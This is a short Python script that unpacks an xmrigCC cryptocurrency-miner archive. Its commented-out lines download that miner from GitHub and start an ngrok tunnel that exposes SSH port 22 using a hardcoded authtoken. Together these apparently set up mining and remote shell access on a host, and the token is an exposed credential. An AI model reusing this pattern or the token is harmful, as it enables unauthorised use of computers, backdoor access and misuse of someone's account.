import subprocess
#subprocess.call("ls && ./ngrok authtoken 1siBHweElRgvcNTEIHUR49WPfcv_5rbwdTbBB5q9cMLJwYcme && ./ngrok tcp 22 --log=stdout > ngrok.log", shell=True)
#import requests

#url = 'https://github.com/Bendr0id/xmrigCC/releases/download/2.9.5/xmrigCC-2.9.5-linux-generic-amd64.tar.gz'
#r = requests.get(url, allow_redirects=True)

#open('xmrigCC-2.9.5-linux-generic-amd64.tar.gz', 'wb').write(r.content)
subprocess.call("tar -xvf xmrigCC-2.9.5-linux-generic-amd64.tar.gz", shell=True)
